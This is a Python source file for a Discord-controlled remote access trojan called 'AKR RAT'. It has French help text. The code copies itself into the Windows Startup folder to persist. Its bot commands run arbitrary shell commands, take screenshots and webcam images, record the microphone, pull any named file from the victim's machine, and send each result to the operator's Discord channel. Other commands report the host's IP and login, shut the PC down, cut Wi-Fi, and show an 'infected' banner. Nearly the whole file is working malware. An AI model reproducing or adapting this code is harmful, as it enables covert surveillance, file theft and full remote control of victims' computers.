import discord
from discord.ext import commands
import os
import platform
import socket
import tkinter as tk
from tkinter import messagebox
import threading
import pyscreenshot
import cv2
import webbrowser
import random
import string
from gtts import gTTS
import time
import shutil
import sys
import winsound
import urllib
import ctypes
import pyautogui
import shutil
import os
from discord.ext import commands
import tempfile
import win32com.client as wincl
import os
import random
import threading
import pyaudio
import wave
import os, base64, json, requests, re

intents = discord.Intents().all()
bot = commands.Bot(command_prefix="!", help_command=None, intents=discord.Intents.all())

system_platform = platform.system()
path = os.path.expanduser('~')
login1 = os.getlogin()
hostname = socket.gethostname()
ip_address = socket.gethostbyname(hostname)
uname_info = platform.uname()

@bot.event
async def on_ready():
    appdata = os.getenv('APPDATA')
    if appdata is None:
        print("La variable d'environnement APPDATA n'a pas été trouvée.")
        return
    startup_folder = os.path.join(appdata, 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
    if not os.path.exists(startup_folder):
        print(f"Le dossier de démarrage n'existe pas : {startup_folder}")
        return
    script_source = sys.argv[0]
    script_name = os.path.basename(script_source)
    script_dest = os.path.join(startup_folder, script_name)
    try:
        shutil.copy(script_source, script_dest)
        print(f"Le fichier {script_name} a été copié dans le dossier de démarrage.")
    except Exception as e:
        print(f"Une erreur est survenue lors de la copie du fichier : {e}")


@bot.command()
async def help(ctx):
    help_text = (
        "**PC INFO** *!pc_info affiche les info du pc* \n"
        "**MESSAGE POP UP** *!message <msg> affiche une pop up du message choisie* \n"
        "**CMD** *!cmd <commande> execute une commande choisie* \n"
        "**SCREEN GRAB** *!screen prend un screen de l ecrant* \n"
        "**CAM GRAB** *!cam prend un screen de l ecrant* \n"
        "**OUVRE UNE URL/LIEN** *!open_url <url> ouvre une url choisie* \n"
        "**SPAM FICHIER** *!add_fichier spamm de 100 fichier* \n"
        "**VOIX** *!voice <msg> lis une phrase a vois haute* \n"
        "**SHUTDOWN** *!stop arrete le pc* \n"
        "**DECO WIFI** *!wifi deco le pc de la wifi* \n"
        "**BRUIT HORRIBLE** *!randombeep fait un bruit horrible* \n"
        "**CHANGE LE FOND** *!fond <url image> change le font d ecrant* \n"
        "**SOURIS MOUVE** *!mouve bouge la souris aleatoire* \n"
        "**VOLE FICHIER** *!steale_fichier <nom du fichier> copie le fichier demander* \n"
        "**ERROR MESSAGE** *!error <message> envoie une erreur avec le message choisie* \n"
        "**RAT MESSAGE** *!message_rat fenetre tkinter qui avertie que le pc est infecter* \n"
        "**SON GRAB** *!songrab prend un enregistrement des 10 prochaine secondes* \n"        
        "*by akr and zxk*"


    )
    await ctx.send(help_text)

@bot.command()
async def pc_info(ctx):
    embed = discord.Embed(
        title="Device Info -> " + hostname,
        color=discord.Color.red() 
    )
    embed.add_field(name="📍 IP:", value=ip_address, inline=False)
    embed.add_field(name="🙎 Hostname:", value=hostname, inline=False)
    embed.add_field(name="🎭 Login:", value=login1, inline=False)
    embed.add_field(name="🗿 Home:", value=path, inline=False)
    embed.add_field(name="🛠️ OS:", value=system_platform, inline=False)
    embed.add_field(name="📈 Processor:", value=uname_info.processor, inline=False)
    embed.add_field(name="📉 Version:", value=uname_info.version, inline=False)
    await ctx.send(embed=embed)

def popup(message):
    root = tk.Tk()
    root.withdraw() 
    messagebox.showinfo("AKR RAT", message)
    root.mainloop()

@bot.command()
async def message(ctx, *, msg: str):
    threading.Thread(target=popup, args=(msg,)).start()
    embed1 = discord.Embed(
        title="✅ Message '" + msg + "' envoyer !",
        color=discord.Color.green() 
    )
    await ctx.send(embed=embed1)

@bot.command()
async def cmd(ctx, *, cmd: str):
    os.system(cmd)
    embed2 = discord.Embed(
        title="✅ Command '" + cmd + "' executee !",
        color=discord.Color.green() 
    )
    await ctx.send(embed=embed2)

@bot.command()
async def screen(ctx):
    try:
        screenshot_path = "screenshot.png"
        screenshot = pyscreenshot.grab()
        screenshot.save(screenshot_path)
        
        await ctx.send("✅ Screenshot:", file=discord.File(screenshot_path))
        
        os.remove(screenshot_path)
    except Exception as e:
        await ctx.send(f"❌ Error: {e}")

@bot.command()
async def cam(ctx):
    try:
        cap = cv2.VideoCapture(0)

        if not cap.isOpened():
            await ctx.send("❌ Error.")
            return

        ret, frame = cap.read()

        if not ret:
            await ctx.send("❌ Error.")
            return
        image_path = "camera_capture.png"
        cv2.imwrite(image_path, frame)
        cap.release()
        await ctx.send("✅ Camera screen:", file=discord.File(image_path))
        os.remove(image_path)

    except Exception as e:
        await ctx.send(f"❌ Error: {e}")

@bot.command()
async def open_url(ctx, *, url: str):
    webbrowser.open(url)
    embed10 = discord.Embed(
        title="✅ URL '" + url + "' ouvert!",
        color=discord.Color.green() 
    )
    await ctx.send(embed=embed10)

def generate_random_filename():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=8)) + ".py"

@bot.command()
async def add_fichier(ctx):
    for i in range(1, 101):
        filename = generate_random_filename()
        
        with open(filename, "w") as file:
            file.write("")  

        await ctx.send(f"✅ {filename} cree.")

@bot.command()
async def stop(ctx):
        os.system("Shutdown /p") 

        await ctx.send(f"✅ PC off.")

@bot.command()
async def wifi(ctx):
        os.system("netsh wlan disconnect") 

        await ctx.send(f"✅ Wifi deco.")

@bot.command()
async def randombeep(ctx):
    for i in range(10):
        winsound.Beep(random.randint(1000, 100000), random.randint(500, 100000))
    await ctx.send("Bips al\u00e9atoires effectu\u00e9s.")

@bot.command()
async def fond(ctx, url: str):
    image_path = "wallpaper.jpg"
    urllib.request.urlretrieve(url, image_path)
    ctypes.windll.user32.SystemParametersInfoW(20, 0, os.path.abspath(image_path), 0)
    await ctx.send("✅ Fond d'\u00e9cran chang\u00e9.")

@bot.command()
async def mouve(ctx,):
    mouve = random.randint(0, 500)
    for i in range(500):
        pyautogui.moveTo(mouve, mouve, duration=2, tween=pyautogui.easeInOutQuad) 

@bot.command()
async def steale_fichier(ctx, *, chemin: str):
    if not os.path.isfile(chemin):
        await ctx.send("Le fichier existe pas.")
        return
    nom_fichier = os.path.basename(chemin)
    
    with tempfile.NamedTemporaryFile(delete=False) as temp_file:
        temp_path = temp_file.name  

        shutil.copy(chemin, temp_path)
    await ctx.send("Voici le fichier :", file=discord.File(temp_path, filename=nom_fichier))

    os.remove(temp_path)

@bot.command()
async def voice(ctx,*,msg: str):
    speak = wincl.Dispatch("SAPI.SpVoice")
    speak.Speak(msg)
    await ctx.send('✅ message envoyer')

@bot.command()
async def error(ctx,*,msg: str):
    messagebox.showerror('Python Error', f'{msg}')

@bot.command()
async def message_rat(ctx):
    root = tk.Tk()
    root.geometry("1000x600")
    root.title("   ")
    root.configure(bg='red')
    message = "Votre PC a été infecté.\n \n https://discord.gg/arkaz"
    label = tk.Label(root, text=message, font=("Helvetica", 45), fg="white", bg="red", padx=50, pady=50)
    label.pack(expand=True) 
    root.mainloop()

@bot.command()
async def songrab(ctx):
    FORMAT = pyaudio.paInt16  
    CHANNELS = 1  
    RATE = 44100  
    CHUNK = 1024  
    TIME = 10  
    OUTPUT_FILENAME = "enregistrement.wav"  

    p = pyaudio.PyAudio()
    stream = p.open(format=FORMAT,
                    channels=CHANNELS,
                    rate=RATE,
                    input=True,
                    frames_per_buffer=CHUNK)
    
    frames = []  

    for _ in range(0, int(RATE / CHUNK * TIME)):
        data = stream.read(CHUNK)  
        frames.append(data)  

    stream.stop_stream()
    stream.close()
    p.terminate()

    with wave.open(OUTPUT_FILENAME, 'wb') as wf:
        wf.setnchannels(CHANNELS)
        wf.setsampwidth(p.get_sample_size(FORMAT))
        wf.setframerate(RATE)
        wf.writeframes(b''.join(frames))

    with tempfile.NamedTemporaryFile(delete=False) as temp_file:
        temp_path = temp_file.name  
        shutil.copy(OUTPUT_FILENAME, temp_path) 

    await ctx.send("Enregistrement :", file=discord.File(temp_path, filename=OUTPUT_FILENAME))

    os.remove(OUTPUT_FILENAME)
    os.remove(temp_path)
bot.run('')
